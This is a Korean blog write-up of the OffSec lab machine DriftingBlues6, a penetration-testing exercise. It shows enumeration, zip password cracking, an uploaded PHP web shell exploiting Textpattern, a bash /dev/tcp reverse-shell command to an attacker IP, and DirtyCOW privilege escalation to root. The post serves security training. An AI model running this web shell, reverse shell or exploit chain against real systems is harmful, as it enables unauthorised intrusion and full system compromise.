---
title: "DriftingBlues6 Writeup"
date: 2025-09-07T00:00:00+09:00
# weight: 1
# aliases: ["/first"]
tags: ["pen-testing", "hacking"]
author: "Me"
categories: ["Penetration Testing"]
# author: ["Me", "You"] # multiple authors

showToc: true
TocOpen: false
draft: false
hidemeta: false
comments: true
description: "Offsec PGP lab DriftingBlues6 Writeup"
# canonicalURL: "https://canonical.url/to/page"
disableHLJS: true # to disable highlightjs
disableShare: false
disableHLJS: false
hideSummary: false
searchHidden: false
ShowReadingTime: true
ShowBreadCrumbs: true
ShowPostNavLinks: true
ShowWordCount: true
ShowRssButtonInSectionTermList: true
UseHugoToc: true
cover:
    image: "posts/cover/offsec.png" # image path/url
    alt: "cover-image"

editPost:
    URL: "https://github.com/hynseok/blog/blob/main/content"
    Text: "Suggest Changes" # edit text
    appendFilePath: true # to append file path to Edit link
---

> target ip: 192.168.224.219

## Enumeration
### Nmap

command
``` shell
sudo nmap -T4 -p- target
```

result
``` shell
Host is up (0.10s latency).
Not shown: 65504 closed tcp ports (reset), 30 filtered tcp ports (no-response)
PORT   STATE SERVICE
80/tcp open  http
```
* 80번 포트만 열려있는 것을 확인할 수 있었습니다.

### Gobuster

command
``` shell
gobuster dir -u http://target -w /usr/share/wordlists/dirb/common.txt -z
```

result
``` shell
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 283]
/.htaccess            (Status: 403) [Size: 283]
/cgi-bin/             (Status: 403) [Size: 282]
/db                   (Status: 200) [Size: 53656]
/index                (Status: 200) [Size: 750]
/index.html           (Status: 200) [Size: 750]
/robots               (Status: 200) [Size: 110]
/robots.txt           (Status: 200) [Size: 110]
/server-status        (Status: 403) [Size: 287]
/textpattern          (Status: 301) [Size: 306] [--> http://target/textpattern/]
===============================================================
Finished
===============================================================
```

```txt
User-agent: *
Disallow: /textpattern/textpattern

dont forget to add .zip extension to your dir-brute
;)

```
- robots.txt에서 `.zip` extension을 포함하라는 팁이 있었습니다.

command
```shell
gobuster dir -u http://target -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x .zip -t 50
```

result
``` shell
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index                (Status: 200) [Size: 750]
/db                   (Status: 200) [Size: 53656]
/robots               (Status: 200) [Size: 110]
/spammer              (Status: 200) [Size: 179]
/spammer.zip          (Status: 200) [Size: 179]
Progress: 108079 / 441122 (24.50%)^C

```
- `spammer.zip` 을 찾을 수 있었습니다.
## Exploitation
### fcrackzip
```shell
fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt spammer.zip
```
- fcrackzip을 통해 zip 파일을 크래킹합니다.

``` shell
PASSWORD FOUND!!!!: pw == myspace4

unzip spammer.zip
Password: myspace4
```

``` shell
cat creds.txt
mayer:lionheart
```

`http://target/textpattern/textpattern` 으로 접속하여 위 계정 정보로 로그인을 합니다.

### Textpattern RCE Vulnerability
[Textpattern 4.8.8 - Remote Code Execution (RCE) (Authenticated) - PHP webapps Exploit](https://www.exploit-db.com/exploits/51176)

![db6-img1.png](images/db6/db6-img1.png)

```php
<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>
```
- 위 RCE 파일을 업로드하고,
- `http://target/textpattern/files/rce.php?cmd=CMD`로 요청을 하여 arbitrary command를 실행할 수 있습니다.

```shell
nc -nvlp 4444

curl http://target/textpattern/files/rce.php?cmd='bash%20-c%20%27bash%20-i%20>%26%20%2Fdev%2Ftcp%2F192.168.45.185%2F4444%200>%261%27'
```

## Privilege Escalation

``` shell
python -c 'import pty; pty.spawn("/bin/bash")'
```
- 새로운 bash 세션을 얻어냅니다.

### linpeas
```shell
wget --no-check-certificate https://github.com/peass-ng/PEASS-ng/releases/download/20250904-4f33e9d0/linpeas.sh

chmod +x linpeas.sh
./linpeas.sh
```

result
``` shell
╔══════════╣ Executing Linux Exploit Suggester
╚ https://github.com/mzet-/linux-exploit-suggester
[+] [CVE-2016-5195] dirtycow

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: [ debian=7|8 ],RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},ubuntu=16.04|14.04|12.04
   Download URL: https://www.exploit-db.com/download/40611
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

[+] [CVE-2016-5195] dirtycow 2

   Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
   Exposure: highly probable
   Tags: [ debian=7|8 ],RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},ubuntu=16.04{kernel:4.4.0-21-generic}
   Download URL: https://www.exploit-db.com/download/40839
   ext-url: https://www.exploit-db.com/download/40847
   Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

```
- dirtycow 공격이 가능한 것으로 확인됐습니다.

### DirtyCOW
[Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method) - Linux local Exploit](https://www.exploit-db.com/exploits/40839)
``` shell
wget --no-check-certificate https://www.exploit-db.com/download/40839
```

```shell
gcc -pthread 40839.c -o dirty -lcrypt
./dirty
```

```shell
/etc/passwd successfully backed up to /tmp/passwd.bak
Please enter the new password: Complete line:
firefart:figsoZwws4Zu6:0:0:pwned:/root:/bin/bash
```

```
su firefart
```
- firefart 계정으로 로그인하여 루트 권한을 획득할 수 있습니다.
